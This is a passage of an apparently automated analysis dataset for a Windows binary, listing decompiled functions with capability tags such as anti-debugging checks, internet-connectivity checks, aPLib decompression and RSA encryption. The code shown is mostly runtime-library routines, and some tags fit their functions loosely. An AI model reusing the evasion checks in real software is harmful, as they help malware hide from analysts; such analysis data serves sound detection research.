iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x41bf4c - *0x41bf50) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x41bf4c < iVar14) {\n                if (iVar14 < *0x41bf48) {\n                    iVar14 = iVar14 + *0x41bf5c;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x41bf54 + (*0x41bf54 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x41bf54 + (*0x41bf54 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x41bf5c + *0x41bf48;\n                }\n                goto code_r0x00412feb;\n            }\n            iVar13 = *0x41bf4c - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x41bf50 + -1;\n            iVar13 = *0x41bf50 + (*0x41bf50 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x41bf50 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x00412ddf;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x00412ddf:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x41bf54 + 1 + (*0x41bf54 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x00412feb:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x41bf58 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x41bf58 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.00406bb6(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3235
    },
    "00413038": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004132dd)\n// WARNING: Removing unreachable block (ram,0x004132a6)\n// WARNING: Removing unreachable block (ram,0x0041368d)\n// WARNING: Removing unreachable block (ram,0x004132b5)\n// WARNING: Removing unreachable block (ram,0x004132bd)\n// WARNING: Removing unreachable block (ram,0x004132c3)\n// WARNING: Removing unreachable block (ram,0x004132c6)\n// WARNING: Removing unreachable block (ram,0x004132cd)\n// WARNING: Removing unreachable block (ram,0x004132d7)\n// WARNING: Removing unreachable block (ram,0x00413332)\n// WARNING: Removing unreachable block (ram,0x0041332c)\n// WARNING: Removing unreachable block (ram,0x00413338)\n// WARNING: Removing unreachable block (ram,0x00413355)\n// WARNING: Removing unreachable block (ram,0x00413357)\n// WARNING: Removing unreachable block (ram,0x0041335f)\n// WARNING: Removing unreachable block (ram,0x00413362)\n// WARNING: Removing unreachable block (ram,0x00413367)\n// WARNING: Removing unreachable block (ram,0x0041336a)\n// WARNING: Removing unreachable block (ram,0x00413696)\n// WARNING: Removing unreachable block (ram,0x00413375)\n// WARNING: Removing unreachable block (ram,0x004136ad)\n// WARNING: Removing unreachable block (ram,0x004136b4)\n// WARNING: Removing unreachable block (ram,0x00413380)\n// WARNING: Removing unreachable block (ram,0x00413393)\n// WARNING: Removing unreachable block (ram,0x00413395)\n// WARNING: Removing unreachable block (ram,0x004133a2)\n// WARNING: Removing unreachable block (ram,0x004133a7)\n// WARNING: Removing unreachable block (ram,0x004133ad)\n// WARNING: Removing unreachable block (ram,0x004133b6)\n// WARNING: Removing unreachable block (ram,0x004133bd)\n// WARNING: Removing unreachable block (ram,0x004133d5)\n// WARNING: Removing unreachable block (ram,0x004133e5)\n// WARNING: Removing unreachable block (ram,0x004133f3)\n// WARNING: Removing unreachable block (ram,0x00413433)\n// WARNING: Removing unreachable block (ram,0x0041343c)\n// WARNING: Removing unreachable block (ram,0x00413653)\n// WARNING: Removing unreachable block (ram,0x0041344a)\n// WARNING: Removing unreachable block (ram,0x00413454)\n// WARNING: Removing unreachable block (ram,0x0041366e)\n// WARNING: Removing unreachable block (ram,0x00413461)\n// WARNING: Removing unreachable block (ram,0x00413468)\n// WARNING: Removing unreachable block (ram,0x00413472)\n// WARNING: Removing unreachable block (ram,0x00413477)\n// WARNING: Removing unreachable block (ram,0x00413487)\n// WARNING: Removing unreachable block (ram,0x0041348c)\n// WARNING: Removing unreachable block (ram,0x00413496)\n// WARNING: Removing unreachable block (ram,0x0041349b)\n// WARNING: Removing unreachable block (ram,0x004134ad)\n// WARNING: Removing unreachable block (ram,0x004134ba)\n// WARNING: Removing unreachable block (ram,0x004134c9)\n// WARNING: Removing unreachable block (ram,0x004134d6)\n// WARNING: Removing unreachable block (ram,0x004134f3)\n// WARNING: Removing unreachable block (ram,0x004134f7)\n// WARNING: Removing unreachable block (ram,0x004134fe)\n// WARNING: Removing unreachable block (ram,0x00413507)\n// WARNING: Removing unreachable block (ram,0x0041350a)\n// WARNING: Removing unreachable block (ram,0x0041351b)\n// WARNING: Removing unreachable block (ram,0x0041352a)\n// WARNING: Removing unreachable block (ram,0x00413535)\n// WARNING: Removing unreachable block (ram,0x0041353c)\n// WARNING: Removing unreachable block (ram,0x00413567)\n// WARNING: Removing unreachable block (ram,0x0041356c)\n// WARNING: Removing unreachable block (ram,0x00413577)\n// WARNING: Removing unreachable block (ram,0x00413580)\n// WARNING: Removing unreachable block (ram,0x00413586)\n// WARNING: Removing unreachable block (ram,0x00413589)\n// WARNING: Removing unreachable block (ram,0x004135af)\n// WARNING: Removing unreachable block (ram,0x004135b4)\n// WARNING: Removing unreachable block (ram,0x004135b9)\n// WARNING: Removing unreachable block (ram,0x004135c4)\n// WARNING: Removing unreachable block (ram,0x004135d5)\n// WARNING: Removing unreachable block (ram,0x00413606)\n// WARNING: Removing unreachable block (ram,0x004135db)\n// WARNING: Removing unreachable block (ram,0x00413601)\n// WARNING: Removing unreachable block (ram,0x004135e5)\n// WARNING: Removing unreachable block (ram,0x004135fb)\n// WARNING: Removing unreachable block (ram,0x004135f4)\n// WARNING: Removing unreachable block (ram,0x00413609)\n// WARNING: Removing unreachable block (ram,0x00413636)\n// WARNING: Removing unreachable block (ram,0x00413613)\n// WARNING: Removing unreachable block (ram,0x0041349f)\n// WARNING: Removing unreachable block (ram,0x0041347c)\n// WARNING: Removing unreachable block (ram,0x00413671)\n// WARNING: Removing unreachable block (ram,0x004133b8)\n// WARNING: Removing unreachable block (ram,0x0041367b)\n// WARNING: Removing unreachable block (ram,0x004136bc)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.00413038(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.0040ab71();\n        *puVar2 = 0x16;\n        fcn.00409a69();\n        fcn.00406bb6(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x004130c1. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x4136e4\n    (**0x4136e4)();\n    return;\n}\n",
        "token_count": 1768
    },
    "0040bcd3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bcd3(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        fcn.0040a8a8();\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "00401a10": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_65ch\n// WARNING: Variable defined which should be unmapped: var_658h\n\nvoid fcn.00401a10(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    double dVar1;\n    double dVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uchar *extraout_ECX;\n    uint32_t uVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    uint unaff_EBX;\n    int32_t iVar12;\n    uint *puVar13;\n    int32_t var_8h;\n    uint32_t var_ch;\n    int32_t var_10h_2;\n    uint var_14h;\n    uint var_330h;\n    int32_t var_10h;\n    uint var_338h;\n    uint var_4h;\n    uint var_334h;\n    int32_t iStackY6648;\n    uint32_t uStackY6644;\n    int32_t iStackY6640;\n    uchar uStackY6636;\n    uint32_t auStackY6624 [197];\n    uint var_19ech_2;\n    uint var_19fch;\n    uint var_19f8h;\n    uint var_19f4h;\n    uint var_19f0h;\n    uint var_19ech;\n    uint var_19e8h;\n    uint var_19e0h;\n    uint var_19dch;\n    uint32_t uStackY4128;\n    uint uStackY1652;\n    uchar *puStackY1648;\n    uint uStackY1644;\n    int32_t iStackY1640;\n    uchar *puStackY1636;\n    uint *puStackY1632;\n    uint var_658h_2;\n    uint in_stack_fffff9a8;\n    int32_t var_330h_2;\n    uint uStack36;\n    uint var_65ch;\n    uint var_658h;\n    \n    fcn.0040f990();\n    fcn.00406bab();\n    iVar4 = fcn.004043d0(var_10h_2 * 4);\n    fcn.00407a08();\n    uStackY6644 = 0;\n    iStackY6648 = 0;\n    if (var_ch == 0) {\n        *extraout_ECX = 0;\n        fcn.00406bb6(unaff_EBX);\n        return;\n    }\n    dVar1 = (*0x419cb8 - *0x419cd8) + *0x419cc8;\n    do {\n        iStackY6640 = var_ch - uStackY6644;\n        if (iVar4 + -1 <= iStackY6640) {\n            iStackY6640 = iVar4 + -1;\n        }\n        auStackY6624[0] = fcn.00406b68();\n        puStackY1632 = 0xffffffff;\n        iVar5 = 1;\n        uVar9 = auStackY6624[0];\n        do {\n            uVar9 = (uVar9 ^ uVar9 >> 0x1e) * 0x6c078965 + iVar5;\n            *(&stack0xffffe620 + iVar5 * 4) = uVar9;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x270);\n        fcn.00402020();\n        uVar9 = uStackY4128 ^ uStackY4128 >> 0xb & puStackY1632;\n        uVar9 = uVar9 ^ (uVar9 & 0xff3a58ad) << 7;\n        uVar9 = uVar9 ^ (uVar9 & 0xffffdf8c) << 0xf;\n        uVar9 = uVar9 ^ uVar9 >> 0x12;\n        dVar2 = uVar9;\n        if (uVar9 < 0) {\n            dVar2 = dVar2 + *0x419cc0;\n        }\n        dVar2 = (dVar2 / dVar1) * *0x419cd0 + *0x419cc8;\n        if (dVar2 < *0x419cd0) {\n            iVar5 = iStackY6640 + 1;\n            uStackY6636 = ROUND(dVar2);\n        }\n        else {\n            uStackY6636 = 0xff;\n            iVar5 = iStackY6640 + 1;\n        }\n        while( true ) {\n            puVar6 = fcn.00406bab();\n            *puVar6 = uStackY6636;\n            puVar10 = puVar6;\n            for (uVar9 = uStackY6644; uVar9 < (uStackY6644 - 1) + iVar5; uVar9 = uVar9 + 1) {\n                puVar10 = puVar10 + 1;\n                *puVar10 = *(uVar9 + var_8h);\n            }\n            puVar7 = fcn.00402170();\n            puVar8 = &fcn.00401a10::var_330h_2;\n            puVar13 = &fcn.00401a10::var_330h_2;\n            for (iVar11 = 0xc9; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar13 = *puVar7;\n                puVar7 = puVar7 + 1;\n                puVar13 = puVar13 + 1;\n            }\n            cVar3 = fcn.00402c00(puVar8);\n            if (cVar3 == '\\0') break;\n            fcn.00407a08();\n            iStackY6640 = iStackY6640 + -1;\n            iVar5 = iVar5 + -1;\n            if (iStackY6640 < 1) {\n                uStack36 = 0x401c7e;\n                fcn.004073a3(L\"blockSize > 0\", L\"Crypto\\\\rsa.cpp\", 0x4f);\n            }\n        }\n        uStackY6644 = uStackY6644 + iStackY6640;\n        puVar8 = &fcn.00401a10::var_330h_2;\n        for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        iVar5 = 0;\n        if (0 < var_10h_2) {\n            puVar8 = &fcn.00401a10::var_330h_2;\n            do {\n                *puVar8 = (&fcn.00401a10::var_14h)[iVar5];\n                iVar5 = iVar5 + 1;\n                puVar8 = puVar8 + 1;\n            } while (iVar5 < var_10h_2);\n        }\n        iVar5 = 0;\n        puVar8 = &stack0xfffff9a8;\n        for (iVar11 = 200; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        if (0 < var_10h) {\n            puVar8 = &stack0xfffff9a8;\n            do {\n                *puVar8 = (&fcn.00401a10::var_338h)[iVar5];\n                iVar5 = iVar5 + 1;\n                puVar8 = puVar8 + 1;\n            } while (iVar5 < var_10h);\n        }\n        puStackY1632 = &fcn.00401a10::var_658h_2;\n        puStackY1636 = 0x401d25;\n        puVar8 = fcn.00403940();\n        puVar7 = &fcn.00401a10::var_330h_2;\n        for (iVar5 = 0xc9; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        iStackY1640 = 0x401d40;\n        puStackY1636 = puVar6;\n        fcn.00407a08();\n        iVar5 = var_330h_2 * 4;\n        iStackY1640 = 0x401d53;\n        puStackY1636 = iVar5;\n        iVar11 = fcn.00406bab();\n        iStackY1640 = 0x401d6c;\n        iVar5 = fcn.004043d0(iVar5);\n        if ((iVar5 < iVar4) && (iVar12 = iVar4 - iVar5,  0 < iVar12)) {\n            puStackY1648 = extraout_ECX + iStackY6648;\n            uStackY1644 = 0;\n            uStackY1652 = 0x401d97;\n            iStackY1640 = iVar12;\n            fcn.0040c5d0();\n            iStackY6648 = iStackY6648 + iVar12;\n        }\n        iVar12 = 0;\n        if (0 < iVar5) {\n            do {\n                extraout_ECX[iStackY6648] = *(iVar12 + iVar11);\n                iVar12 = iVar12 + 1;\n                iStackY6648 = iStackY6648 + 1;\n            } while (iVar12 < iVar5);\n        }\n        uStackY1644 = 0x401dde;\n        iStackY1640 = iVar11;\n        fcn.00407a08();\n    } while (uStackY6644 < var_ch);\n    extraout_ECX[iStackY6648] = 0;\n    var_658h_2 = 0x401e0d;\n    fcn.00406bb6(in_stack_fffff9a8);\n    return;\n}\n",
        "token_count": 2254
    },
    "00401f60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00401f60(void)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *unaff_ESI;\n    int32_t iVar3;\n    \n    puVar2 = unaff_ESI + 0x271;\n    iVar3 = 0xe3;\n    do {\n        uVar1 = (puVar2[1] ^ *puVar2) & 0x7fffffff ^ *puVar2;\n        puVar2[-0x270] = -((uVar1 & 1) != 0) & 0x9908b0df ^ puVar2[0x18d] ^ uVar1 >> 1;\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puVar2 = unaff_ESI + 0x354;\n    iVar3 = 0x18c;\n    do {\n        uVar1 = (*puVar2 ^ puVar2[1]) & 0x7fffffff ^ *puVar2;\n        puVar2[-0x270] = -((uVar1 & 1) != 0) & 0x9908b0df ^ puVar2[-0x353] ^ uVar1 >> 1;\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    uVar1 = (unaff_ESI[0x4e0] ^ unaff_ESI[1]) & 0x7fffffff ^ unaff_ESI[0x4e0];\n    unaff_ESI[0x270] = -((uVar1 & 1) != 0) & 0x9908b0df ^ unaff_ESI[0x18d] ^ uVar1 >> 1;\n    *unaff_ESI = 0;\n    return;\n}\n",
        "token_count": 430
    },
    "00402020": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00402020(void)\n\n{\n    int32_t in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    puVar1 = in_EAX + 0x638;\n    iVar4 = 0x68;\n    do {\n        uVar3 = puVar1[-0x18c];\n        uVar2 = (puVar1[-0x18d] ^ uVar3) & 0x7fffffff ^ puVar1[-0x18d];\n        puVar1[0xe3] = -((uVar2 & 1) != 0) & 0x9908b0df ^ uVar2 >> 1 ^ *puVar1;\n        uVar2 = puVar1[-0x18b];\n        uVar3 = (uVar2 ^ uVar3) & 0x7fffffff ^ uVar3;\n        puVar1[0xe4] = -((uVar3 & 1) != 0) & 0x9908b0df ^ puVar1[1] ^ uVar3 >> 1;\n        uVar3 = puVar1[-0x18a];\n        uVar2 = (uVar3 ^ uVar2) & 0x7fffffff ^ uVar2;\n        puVar1[0xe5] = -((uVar2 & 1) != 0) & 0x9908b0df ^ puVar1[2] ^ uVar2 >> 1;\n        uVar2 = puVar1[-0x189];\n        uVar3 = (uVar2 ^ uVar3) & 0x7fffffff ^ uVar3;\n        puVar1[0xe6] = -((uVar3 & 1) != 0) & 0x9908b0df ^ puVar1[3] ^ uVar3 >> 1;\n        uVar3 = puVar1[-0x188];\n        uVar2 = (uVar3 ^ uVar2) & 0x7fffffff ^ uVar2;\n        uVar3 = (puVar1[-0x187] ^ uVar3) & 0x7fffffff ^ uVar3;\n        puVar1[0xe7] = -((uVar2 & 1) != 0) & 0x9908b0df ^ puVar1[4] ^ uVar2 >> 1;\n        puVar1[0xe8] = -((uVar3 & 1) != 0) & 0x9908b0df ^ puVar1[5] ^ uVar3 >> 1;\n        puVar1 = puVar1 + 6;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return;\n}\n",
        "token_count": 628
    },
    "00407305": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407305(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *var_10h;\n    char *var_4h;\n    \n    do {\n        iVar2 = fcn.00407ae0(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.004098b7(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x41c24c & 1) == 0) {\n        *0x41c24c = *0x41c24c | 1;\n        var_4h = \"bad allocation\";\n        fcn.00406bc5(&var_4h);\n        *0x41c240 = vtable.std::bad_alloc.0;\n        fcn.00407c97(0x4149c1);\n    }\n    fcn.00406cdb(0x41c240);\n    var_10h = vtable.std::bad_alloc.0;\n    fcn.004083c3(&var_10h, 0x41a3e0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 277
    },
    "0040e95b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e95b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a940(0x41a2a0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0040ab84();\n        *puVar2 = 0;\n        puVar2 = fcn.0040ab71();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x41d4b0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x41d4c0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040faaa(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0040ab71();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0040ab84();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040e25e(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040ea27();\n                goto code_r0x0040ea1e;\n            }\n        }\n        puVar2 = fcn.0040ab84();\n        *puVar2 = 0;\n        puVar2 = fcn.0040ab71();\n        *puVar2 = 9;\n        fcn.00409a69();\n    }\ncode_r0x0040ea1e:\n    fcn.0040a985();\n    return;\n}\n",
        "token_count": 620
    },
    "004014f0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.004014f0(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *arg_ch;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t **in_FS_OFFSET;\n    uint *var_4h;\n    uint32_t var_ch_4;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack56;\n    code *apcStack40 [3];\n    uint32_t var_24h;\n    uint uStack24;\n    uint32_t *puStack20;\n    int32_t *piStack16;\n    uint var_14h;\n    uint var_10h_3;\n    uint var_ch_3;\n    \n    var_14h = 0x4146b0;\n    piStack16 = *in_FS_OFFSET;\n    uStack56 = *0x41b0e4 ^ &var_ch_3;\n    puStack20 = &uStack56;\n    *in_FS_OFFSET = &piStack16;\n    uVar4 = var_ch_4 | 0xf;\n    uVar5 = var_ch_4;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = var_4h[5];\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar5 = uVar3 + uVar1,  -uVar3 - 2 < uVar1)) {\n            uVar5 = 0xfffffffe;\n        }\n    }\n    arg_8h = NULL;\n    var_10h_3 = 0;\n    puVar2 = &uStack56;\n    if ((uVar5 + 1 != 0) && (arg_8h = fcn.00407305(uVar5 + 1),  puVar2 = puStack20,  arg_8h == NULL)) {\n        uStack24 = 0;\n        fcn.00406c4d(&uStack24);\n        apcStack40[0] = vtable.std::bad_alloc.0;\n        fcn.004083c3(apcStack40, 0x41a3e0);\n        var_24h = var_ch_4;\n        var_10h_3 = CONCAT31(var_10h_3._1_3_, 2);\n        puStack20 = &stack0xffffffbc;\n        fcn.004016d0();\n        return 0x4015bf;\n    }\n    puStack20 = puVar2;\n    if (param_3 != 0) {\n        arg_ch = var_4h;\n        if (0xf < var_4h[5]) {\n            arg_ch = *var_4h;\n        }\n        fcn.0040d0f0(arg_8h, arg_ch, param_3);\n    }\n    if (0xf < var_4h[5]) {\n        fcn.004072a9();\n    }\n    *var_4h = 0;\n    *var_4h = arg_8h;\n    var_4h[5] = uVar5;\n    var_4h[4] = param_3;\n    if (0xf < uVar5) {\n        var_4h = arg_8h;\n    }\n    *(var_4h + param_3) = 0;\n    *in_FS_OFFSET = piStack16;\n    return arg_8h;\n}\n",
        "token_count": 855
    },
    "004016d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
